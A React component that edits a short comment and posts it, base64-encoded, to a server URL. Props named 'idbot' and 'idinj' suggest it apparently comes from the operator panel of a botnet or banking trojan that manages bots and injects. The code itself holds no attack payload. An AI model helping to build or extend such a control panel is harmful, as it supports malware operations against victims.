import React from 'react';
import SettingsContext from '../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';

class EditCommentUniversal extends React.Component {
    
    constructor(props) {
        super(props);
        this.InputComment = React.createRef();
        this.state = {
          oldtext: props.text,
          text: props.text,
          EditState: false,
          divStyle: '#e3e3e3'
        }
    }

    componentWillReceiveProps(newProps) {
        if(this.state.oldtext != newProps.text) {
            this.setState({
                oldtext: newProps.text,
                text: newProps.text,
                divStyle: '#e3e3e3'
            });
        }
    }

    onChange = (e) => {
        this.setState({ 
            text: e.target.value.substring(0,40),
            divStyle: this.state.text == this.state.oldtext ? '#e3e3e3':'#e3e3e3'
        });
    }
    
    
    onKeyUP = (e) => {
        if (e.keyCode == 13) {
            //Enter 
            this.OnSendData();
        }
    }

    OnSendData() {
        let params = '';
        if(!isNullOrUndefined(this.props.idinj)) {
            params = new Buffer('{"sent_request":"' + this.props.request + '","ID":"' + this.props.idinj + '","DATA":"' + new Buffer(this.state.text).toString('base64') + '"}').toString('base64');
        }
        if(!isNullOrUndefined(this.props.idbot)) {
            params = new Buffer('{"sent_request":"' + this.props.request + '","ID":"' + this.props.idbot + '","DATA":"' + new Buffer(this.state.text).toString('base64') + '"}').toString('base64');
        }
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': params
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error)) {
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else {
					SettingsContext.ShowToast('success', result.message);
					this.props.parentObj.ChangeDefaultComment(this.state.text);
					this.setState({
						oldtext: this.state.text,
						EditState: false,
						divStyle: '#e3e3e3'
					})
				}
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error edit comment. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    OnStartEdit() {
        this.setState({
            EditState: true
        });
    }

    componentDidUpdate() {
        this.SetFocusToInput();
    }

    componentDidMount() {
        this.SetFocusToInput();
    }

    SetFocusToInput() {
        if(this.state.EditState) {
            this.InputComment.current.focus();
        }
    }

    render() {
        return (
            <React.Fragment>
                {this.state.EditState ? <input onBlur={this.OnSendData.bind(this)} ref={this.InputComment} class="form-control" style={({backgroundColor:this.state.divStyle})} value={this.state.text} onChange={this.onChange} onKeyUp={this.onKeyUP} placeholder="Comment" /> : <input onClick={this.OnStartEdit.bind(this)} value={this.state.text} class="form-control commentunversal" readOnly={true}/>}
            </React.Fragment>
        );
    }
}

export default EditCommentUniversal;